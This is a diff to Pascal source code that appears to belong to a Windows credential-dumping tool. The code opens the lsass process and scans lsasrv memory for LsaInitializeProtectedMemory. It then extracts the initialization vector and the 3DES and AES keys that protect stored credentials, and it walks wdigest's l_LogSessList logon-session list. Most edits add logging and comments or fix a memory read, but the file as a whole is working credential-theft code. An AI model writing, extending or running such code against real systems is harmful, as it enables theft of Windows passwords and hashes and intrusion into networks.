@@ -532,13 +532,15 @@ log('hMod:'+inttohex(hmod,sizeof(pointer)),0);
 fillchar(MODINFO,sizeof(MODINFO),0);
 GetModuleInformation (getcurrentprocess,hmod,MODINFO ,sizeof(MODULEINFO));
 keySigOffset:=SearchMem(getcurrentprocess,MODINFO.lpBaseOfDll ,MODINFO.SizeOfImage,pattern);
-log('keySigOffset:'+inttohex(keySigOffset,sizeof(pointer)),0);
+log('keySigOffset:'+inttohex(keySigOffset,sizeof(pointer)),0); //dd lsasrv!LsaInitializeProtectedMemory
 
 
 //lets search in lsass mem now
 hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
                                       false,pid);
 
+//we dont need the below apart from testing if module is loaded in lsass ...
+{
 lsasrvMem:=0;
 EnumProcessModules(hprocess, @hMods, SizeOf(hmodule)*1024, cbNeeded);
 for count:=0 to cbneeded div sizeof(thandle) do
@@ -546,12 +548,18 @@ for count:=0 to cbneeded div sizeof(thandle) do
       GetModuleFileNameExA( hProcess, hMods[count], szModName,sizeof(szModName) );
       dummy:=lowercase(strpas(szModName ));
       //writeln(dummy);
-      if pos(module,dummy)>0 then begin lsasrvMem:=hMods[count];break;end;
+      if pos(module,dummy)>0 then
+         begin
+         lsasrvMem:=hMods[count];
+         log('lsasrvMem:'+inttohex(lsasrvMem,sizeof(lsasrvMem)));
+         break;
+         end;
     end;
 if lsasrvMem=0 then exit;
-//writeln('sizeof(pointer):'+inttostr(sizeof(pointer)));
-//writeln('sizeof(nativeuint):'+inttostr(sizeof(nativeuint)));
-// Retrieve offset to InitializationVector address due to "lea reg, [InitializationVector]" instruction
+}
+
+//InitializationVector
+//Retrieve offset to InitializationVector address due to "lea reg, [InitializationVector]" instruction
 ivOffset:=0;
 if ReadMem(hprocess, keySigOffset + IV_OFFSET, @ivOffset, 4)=false then
     begin
@@ -562,7 +570,7 @@ if ReadMem(hprocess, keySigOffset + IV_OFFSET, @ivOffset, 4)=false then
 ivOffset:=keySigOffset + IV_OFFSET+ivOffset+4;
 {$endif CPU64}
 //will match dd lsasrv!InitializationVector
-log('IV_OFFSET:'+inttohex(ivOffset,sizeof(pointer)),0);
+log('IV_OFFSET:'+inttohex(ivOffset,sizeof(pointer)),0); //dd InitializationVector
 ReadMem(hprocess, ivoffset, @iv_, sizeof(iv_));
 log('IV:'+ByteToHexaString (IV_),0);
 setlength(iv,sizeof(iv_));
@@ -575,6 +583,7 @@ CopyMemory(@iv[0],@iv_[0],sizeof(iv_));
 
 //7FFEEE94D9DA
 
+//h3DesKey
 // Retrieve offset to h3DesKey address due to "lea reg, [h3DesKey]" instruction
 desOffset:=0;
 if ReadMem(hprocess, keySigOffset + DES_OFFSET, @desOffset, 4)=false then
@@ -617,7 +626,8 @@ if (winver='6.3.9600') or (copy(winver,1,3)='10.') then
    log(ByteToHexaString(deskey));
    end;
 
-// Retrieve offset to hAesKey address due to "lea reg, [hAesKey]" instruction
+//hAesKey
+//Retrieve offset to hAesKey address due to "lea reg, [hAesKey]" instruction
 aesOffset:=0;
 if ReadMem(hprocess, keySigOffset + AES_OFFSET, @aesOffset, 4)=false then
    begin
@@ -1055,6 +1065,15 @@ begin
           patch_pos:=-6;
      end;
 
+  {
+  if lowercase(getenv('l_LogSessList'))<>'' then
+     begin
+     patch_pos:=-1;
+     offset:=int64(strtoint('$'+getenv('l_LogSessList')));
+     log('env l_LogSessList:'+inttohex(offset,sizeof(offset)));
+     end;
+  }
+
   if patch_pos =0 then
      begin
      log('no patch mod for this windows version',1);
@@ -1078,9 +1097,9 @@ begin
                                  begin
                                  log('found:'+inttohex(offset,sizeof(pointer)),0);
                                  //
-                                 if ReadMem  (hprocess,offset+patch_pos,offset_list) then
+                                 if ReadMem  (hprocess,offset+patch_pos,@offset_list_dword,sizeof(offset_list_dword)) then
                                    begin
-                                   CopyMemory(@offset_list_dword,@offset_list[0],4);
+                                   //CopyMemory(@offset_list_dword,@offset_list[0],4);
                                    log('ReadProcessMemory OK '+inttohex(offset_list_dword{$ifdef CPU64}+4{$endif CPU64},4));
                                    //we now should get a match with .load wdigest.dll then dd wdigest!l_LogSessList
                                    //new offset to the list entry
